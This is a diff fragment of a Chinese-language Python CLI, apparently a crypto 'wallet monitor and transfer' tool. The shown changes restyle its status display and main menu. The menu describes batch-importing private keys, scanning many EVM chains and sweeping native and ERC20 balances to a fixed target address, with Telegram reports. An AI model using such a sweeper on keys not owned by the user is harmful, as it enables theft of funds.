+        available_networks = sum(1 for status in self.network_status.values() if status.available)
+        total_networks = len(SUPPORTED_NETWORKS)
+        mainnet_count = sum(1 for net_key in SUPPORTED_NETWORKS.keys() 
+                           if net_key in MAINNET_NETWORKS and 
+                           self.network_status.get(net_key, NetworkStatus(False, "", 0, "")).available)
+        testnet_count = available_networks - mainnet_count
+        
+        # 获取API和速率信息
+        rate_info = calculate_optimal_scanning_params()
+        api_status = get_api_keys_status()
+        
+        # 获取转账统计
+        total_transfers = TRANSFER_STATS['total_transfers']
+        total_amount = TRANSFER_STATS['total_amount_eth']
+        erc20_transfers = TRANSFER_STATS.get('erc20_transfers', 0)
+        
+        # 🎨 美化状态框
+        print(f"{Fore.YELLOW}┌─── {Fore.CYAN}📊 系统状态概览{Fore.YELLOW} ───────────────────────────────────────────────────┐{Style.RESET_ALL}")
+        
+        # 钱包信息行
+        wallet_status = f"{Fore.GREEN}✅ {len(self.wallets)} 个已导入{Style.RESET_ALL}" if self.wallets else f"{Fore.RED}❌ 未导入钱包{Style.RESET_ALL}"
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 💼 {Fore.CYAN}钱包:{Style.RESET_ALL} {wallet_status:<35} {Fore.LIGHTBLACK_EX}目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        # 网络信息行  
+        network_bar = self.create_progress_bar(available_networks, total_networks, 20)
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 🌐 {Fore.CYAN}网络:{Style.RESET_ALL} {available_networks}/{total_networks} 可用 {network_bar} {Fore.GREEN}主网:{mainnet_count}{Style.RESET_ALL} {Fore.BLUE}测试:{testnet_count}{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        # 转账统计行
+        if total_transfers > 0:
+            transfer_info = f"{Fore.GREEN}✅ {total_transfers} 笔 (${total_amount:.6f} ETH) 🪙{erc20_transfers} ERC20{Style.RESET_ALL}"
+        else:
+            transfer_info = f"{Fore.LIGHTBLACK_EX}📋 暂无转账记录{Style.RESET_ALL}"
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 📋 {Fore.CYAN}转账:{Style.RESET_ALL} {transfer_info:<55} {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        # API状态行
+        api_indicator = f"#{CURRENT_API_KEY_INDEX + 1}/{api_status['total_keys']}"
+        api_usage = f"[{API_REQUEST_COUNT}/{REQUESTS_PER_API}]"
+        api_key_display = f"{ALCHEMY_API_KEYS[CURRENT_API_KEY_INDEX][:12]}..." if ALCHEMY_API_KEYS else "未配置"
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 🔑 {Fore.CYAN}API:{Style.RESET_ALL} {api_indicator} ({api_key_display}) {api_usage} {Fore.GREEN}轮询系统{Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        # 速率控制行
+        usage_percent = rate_info['current_usage_percent']
+        usage_bar = self.create_usage_bar(usage_percent, 15)
+        remaining_days = rate_info['remaining_days']
+        interval = rate_info['optimal_interval']
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} ⚡ {Fore.CYAN}速率:{Style.RESET_ALL} {remaining_days}天剩余 {usage_bar} {usage_percent:.1f}%已用 间隔{interval:.1f}s {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        # TG通知状态行
+        tg_status = f"{Fore.GREEN}✅ 已启用{Style.RESET_ALL}" if TELEGRAM_NOTIFICATIONS_ENABLED else f"{Fore.RED}❌ 已禁用{Style.RESET_ALL}"
+        tg_stats = f"成功:{TRANSFER_STATS['successful_notifications']} 失败:{TRANSFER_STATS['failed_notifications']}"
+        print(f"{Fore.YELLOW}│{Style.RESET_ALL} 📱 {Fore.CYAN}TG通知:{Style.RESET_ALL} {tg_status} {Fore.LIGHTBLACK_EX}({tg_stats}){Style.RESET_ALL} {Fore.YELLOW}│{Style.RESET_ALL}")
+        
+        print(f"{Fore.YELLOW}└─────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+
+    def create_progress_bar(self, current: int, total: int, length: int = 20) -> str:
+        """创建进度条"""
+        if total == 0:
+            return f"{Fore.RED}{'█' * length}{Style.RESET_ALL}"
+        
+        progress = current / total
+        filled = int(progress * length)
+        
+        if progress >= 0.8:
+            color = Fore.GREEN
+        elif progress >= 0.5:
+            color = Fore.YELLOW  
+        else:
+            color = Fore.RED
+            
+        bar = color + '█' * filled + Fore.LIGHTBLACK_EX + '░' * (length - filled) + Style.RESET_ALL
+        return f"[{bar}]"
+
+    def create_usage_bar(self, percentage: float, length: int = 15) -> str:
+        """创建使用率进度条"""
+        filled = int((percentage / 100) * length)
+        
+        if percentage >= 80:
+            color = Fore.RED
+        elif percentage >= 60:
+            color = Fore.YELLOW
+        else:
+            color = Fore.GREEN
+            
+        bar = color + '█' * filled + Fore.LIGHTBLACK_EX + '░' * (length - filled) + Style.RESET_ALL
+        return f"[{bar}]"
+    
     def main_menu(self):
-        """主菜单 - 完全优化的交互体验"""
+        """主菜单 - 超级美化版本"""
         while True:
             # 清屏，提供清爽的界面
             try:
@@ -3094,38 +3564,66 @@ class WalletMonitor:
             except:
                 print("\n" * 50)  # 替代清屏
             
-            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v3.0 - 纯RPC网络版{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}支持{len(SUPPORTED_NETWORKS)}个EVM兼容链 | 无限API密钥轮询 | 智能优化{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
+            # 🌟 超级美化的横幅
+            print(f"\n{Back.MAGENTA}{Fore.WHITE}{'  ' * 45}{Style.RESET_ALL}")
+            print(f"{Back.MAGENTA}{Fore.WHITE}    🚀 {Fore.YELLOW}钱包监控转账系统 v4.0{Fore.WHITE} - 智能3阶段扫描版 🚀    {Style.RESET_ALL}")
+            print(f"{Back.MAGENTA}{Fore.WHITE}    💎 {len(SUPPORTED_NETWORKS)}个EVM链 | 🪙 ERC20代币 | 📱 TG通知 | ⚡ 智能Gas     {Style.RESET_ALL}")
+            print(f"{Back.MAGENTA}{Fore.WHITE}{'  ' * 45}{Style.RESET_ALL}\n")
             
-            self.show_status()
+            # 🎨 新功能亮点展示
+            print(f"{Fore.MAGENTA}┌{'─' * 78}┐{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│ ✨ {Fore.CYAN}新功能亮点{Fore.MAGENTA}                                                      │{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│ {Fore.GREEN}🔍 动态RPC测试{Fore.WHITE} → {Fore.YELLOW}📊 交易记录分析{Fore.WHITE} → {Fore.BLUE}💰 智能余额扫描{Fore.MAGENTA}        │{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│ {Fore.GREEN}💰 实时代币价值查询{Fore.WHITE} | {Fore.YELLOW}⚡ 小余额Gas优化{Fore.WHITE} | {Fore.BLUE}📱 完整TG报告{Fore.MAGENTA}        │{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}└{'─' * 78}┘{Style.RESET_ALL}\n")
             
-            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(智能3阶段扫描：RPC测试→交易记录→余额转账+ERC20){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 🔑 API密钥管理 {Fore.GREEN}(轮询系统，无限扩展){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🔄 重启程序    {Fore.GREEN}(清理缓存，重新初始化){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(完整指南，故障排除){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}7.{Style.RESET_ALL} 🚪 退出程序    {Fore.GREEN}(安全退出，保存状态){Style.RESET_ALL}")
+            # 🎯 系统状态美化显示
+            self.show_enhanced_status()
             
-            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}💡 系统就绪，等待您的选择...{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}📝 请输入数字1-7，然后按回车键确认{Style.RESET_ALL}")
+            # 🎨 美化菜单
+            print(f"\n{Fore.CYAN}┌─── {Fore.YELLOW}🎯 功能菜单{Fore.CYAN} ────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}│{Style.RESET_ALL}                                                                      {Fore.CYAN}│{Style.RESET_ALL}")
+            
+            menu_items = [
+                ("1", "📥", "导入私钥", "智能批量识别，支持任意格式", Fore.GREEN),
+                ("2", "🎯", "开始监控", "智能3阶段扫描：RPC→交易→余额+ERC20", Fore.YELLOW),
+                ("3", "📊", "详细状态", "完整诊断，网络分析，性能监控", Fore.BLUE),
+                ("4", "🔑", "API密钥管理", "轮询系统，无限扩展，智能切换", Fore.MAGENTA),
+                ("5", "🔄", "重启程序", "清理缓存，重新初始化网络", Fore.CYAN),
+                ("6", "📖", "使用帮助", "完整指南，故障排除，操作说明", Fore.WHITE),
+                ("7", "🚪", "退出程序", "安全退出，保存状态，清理资源", Fore.RED)
+            ]
+            
+            for num, icon, title, desc, color in menu_items:
+                print(f"{Fore.CYAN}│{Style.RESET_ALL} {Back.BLACK}{color}{num}{Style.RESET_ALL} {icon} {Fore.WHITE}{title:<12}{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{desc:<35}{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
+            
+            print(f"{Fore.CYAN}│{Style.RESET_ALL}                                                                      {Fore.CYAN}│{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+            
+            # 🎨 美化输入提示
+            print(f"\n{Fore.GREEN}┌─── {Fore.YELLOW}💡 操作提示{Fore.GREEN} ───┐{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}│{Style.RESET_ALL} {Fore.CYAN}📝 请输入数字 1-7{Style.RESET_ALL}    {Fore.GREEN}│{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}│{Style.RESET_ALL} {Fore.YELLOW}⏳ 然后按回车键确认{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}└─────────────────────┘{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.MAGENTA}✨ 系统就绪，等待您的选择...{Style.RESET_ALL}")
             
             try:
                 # 确保提示信息完全显示
                 import sys
                 sys.stdout.flush()
                 
-                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-7): {Style.RESET_ALL}", "").strip()
+                choice = enhanced_safe_input(f"\n{Back.BLUE}{Fore.WHITE} ➤ 请选择功能: {Style.RESET_ALL} ", "").strip()
+                
+                if choice:
+                    print(f"\n{Fore.GREEN}🎉 您选择了选项 {Back.GREEN}{Fore.BLACK} {choice} {Style.RESET_ALL} {Fore.GREEN}正在执行...{Style.RESET_ALL}")
+                    time.sleep(0.5)  # 视觉反馈延迟
                 
                 # 处理空输入
                 if not choice:
-                    print(f"\n{Fore.YELLOW}⚠️ 您没有输入任何内容，请输入 1-7{Style.RESET_ALL}")
-                    print(f"{Fore.CYAN}💡 提示: 请输入菜单中显示的数字，然后按回车键{Style.RESET_ALL}")
-                    time.sleep(2)
+                    print(f"\n{Back.RED}{Fore.WHITE} ⚠️ 输入为空 {Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1-7)，然后按回车键{Style.RESET_ALL}")
+                    time.sleep(3)
                     continue
                 
                 # 显示用户选择的确认
